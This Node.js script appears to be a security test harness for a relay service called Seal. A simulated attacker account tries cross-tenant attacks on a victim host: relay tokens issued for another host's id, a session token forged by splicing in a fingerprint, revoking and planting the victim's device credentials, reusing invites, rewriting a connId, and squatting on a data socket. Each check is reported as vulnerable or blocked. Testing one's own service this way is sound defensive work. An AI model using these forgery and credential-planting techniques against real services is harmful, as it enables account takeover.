#!/usr/bin/env node
// Attacker: another Seal user on the same relay. Anyone can be one: a host account is nothing
// but an X25519 key the caller generates (see check 1). The attacker ("mallory") holds a fully
// valid host session, relay JWT and control socket for their own key, and turns them on a victim
// host ("brian") that shares the Worker.
import { randomUUID } from 'node:crypto'
import {
  controlRequest,
  createInvite,
  dataAttach,
  freshSourceIp,
  hostOnline,
  installResumeCredential,
  nextConnOpen,
  openSocket,
  phoneOpen,
  postJson,
  relayAuthFrame,
  relayOrigin,
  report,
  revokeDevice,
  setSourceIp,
  sha256B64url,
  splice,
  wsOrigin,
  randomToken
} from '../lib/relay-protocol.mjs'

const origin = relayOrigin()
setSourceIp(freshSourceIp())
const brian = await hostOnline(origin)
const brianDevice = await installResumeCredential(brian.control)

setSourceIp(freshSourceIp())
const mallory = await hostOnline(origin)
report(
  '1. a stranger with a self-generated key becomes a relay host (no allowlist, no enrollment secret)',
  'VULNERABLE (open relay)',
  {
    malloryHostId: mallory.keys.hostId,
    relayJwtIssued: Boolean(mallory.relayToken),
    controlSeated: mallory.ack?.type === 'host-hello-ack'
  }
)

// ---- HTTP: mallory's credentials naming brian ----
{
  const token = await postJson(
    origin,
    '/v1/host/relay-token',
    { relayHostId: brian.keys.hostId, hostPublicKeyB64: brian.keys.publicKeyB64 },
    { authorization: `Bearer ${mallory.session.sessionToken}` }
  )
  report(
    "relay token for brian's host id with mallory's session",
    token.status === 200 ? 'VULNERABLE' : 'blocked',
    { http: token.status }
  )
  const assignment = await postJson(
    origin,
    '/v1/assign',
    { v: 1, relayHostId: brian.keys.hostId },
    { authorization: `Bearer ${mallory.relayToken}` }
  )
  report(
    "/v1/assign for brian's host id with mallory's relay JWT",
    assignment.status === 200 ? 'VULNERABLE' : 'blocked',
    { http: assignment.status }
  )
  // Session token with brian's fingerprint spliced onto mallory's expiry and signature.
  const [, expires, signature] = mallory.session.sessionToken.split('.')
  const forged = await fetch(`${origin}/v1/devices`, {
    headers: { authorization: `Bearer ${brian.keys.hostId}.${expires}.${signature}` }
  })
  report(
    "session token re-labelled with brian's fingerprint",
    forged.status === 200 ? 'VULNERABLE' : 'blocked',
    { http: forged.status }
  )
}

// ---- control commands aimed at brian's device ----
{
  const revoke = await revokeDevice(mallory.control, brianDevice.relayDeviceId)
  const stillWorks = await splice(origin, brian, brianDevice.resumeToken)
  report(
    "mallory sends device-revoke for brian's relayDeviceId",
    stillWorks.hello?.ok === true ? 'blocked (scoped to mallory)' : 'VULNERABLE',
    { reply: revoke?.type, brianPhoneStillConnects: stillWorks.hello?.ok }
  )
  stillWorks.phone.ws.terminate()
  // Mallory installs her own token for brian's device id, then presents it on brian's host.
  const planted = randomToken()
  await controlRequest(
    mallory.control,
    'device-credential-install',
    {
      v: 1,
      relayDeviceId: brianDevice.relayDeviceId,
      newResumeTokenHash: sha256B64url(planted),
      authorization: { mode: 'authenticated-direct', directAuthId: randomUUID() }
    },
    'device-credential-installed'
  )
  const phone = await phoneOpen(origin, brian.keys.hostId)
  phone.ws.send(relayAuthFrame(planted))
  const hello = await phone.nextJson(2500)
  report(
    "credential installed through mallory's control presented at brian's host",
    hello?.ok === true ? 'VULNERABLE' : 'blocked',
    { hello }
  )
  // And mallory's own invite at brian's host.
  const invite = await createInvite(mallory.control)
  const phone2 = await phoneOpen(origin, brian.keys.hostId)
  phone2.ws.send(relayAuthFrame(invite.inviteToken))
  const hello2 = await phone2.nextJson(2500)
  report(
    "mallory's invite presented at brian's host",
    hello2?.ok === true ? 'VULNERABLE' : 'blocked',
    { hello: hello2 }
  )
}

// ---- brian's data path ----
{
  // Mallory's data socket presenting her own valid ticket on a connId under brian's host id.
  const invite = await createInvite(mallory.control)
  const own = await phoneOpen(origin, mallory.keys.hostId)
  own.ws.send(relayAuthFrame(invite.inviteToken))
  const open = await nextConnOpen(mallory.control)
  const forgedConnId = open.connId.replace(mallory.keys.hostId, brian.keys.hostId)
  const data = await dataAttach(
    origin,
    { connId: forgedConnId, connTicket: open.connTicket },
    mallory.ack.generation
  )
  report(
    "mallory's ticket on a connId rewritten to brian's host id",
    (await data.waitClosed(15000))?.code === 4401 ? 'blocked' : 'VULNERABLE',
    { close: data.closed }
  )
  own.ws.terminate()
}
{
  // If a connId leaks, the first data socket to arrive occupies the splice before proving the
  // ticket; the real host's socket is then refused until the attach deadline.
  const phone = await phoneOpen(origin, brian.keys.hostId)
  phone.ws.send(relayAuthFrame(brianDevice.resumeToken))
  const open = await nextConnOpen(brian.control)
  const squatter = openSocket(`${wsOrigin(origin)}/v1/host/data/${encodeURIComponent(open.connId)}`)
  await squatter.open()
  const real = await dataAttach(origin, open, brian.ack.generation)
  const hello = await phone.nextJson(12000)
  report(
    'data socket squatting with a leaked connId (ticket unknown)',
    hello?.ok === true ? 'blocked' : 'info (denies that one connection; needs the 122-bit connId)',
    {
      phoneHello: hello,
      realHostDataClose: await real.waitClosed(1000),
      squatterClose: await squatter.waitClosed(1000)
    }
  )
}

// ---- same-key takeover needs the key ----
report('host id is 96 bits of SHA-256 over the public key', 'info', {
  secondPreimageWork: '2^96 key generations to collide with a chosen host id'
})
brian.control.ws.terminate()
mallory.control.ws.terminate()
process.exit(0)
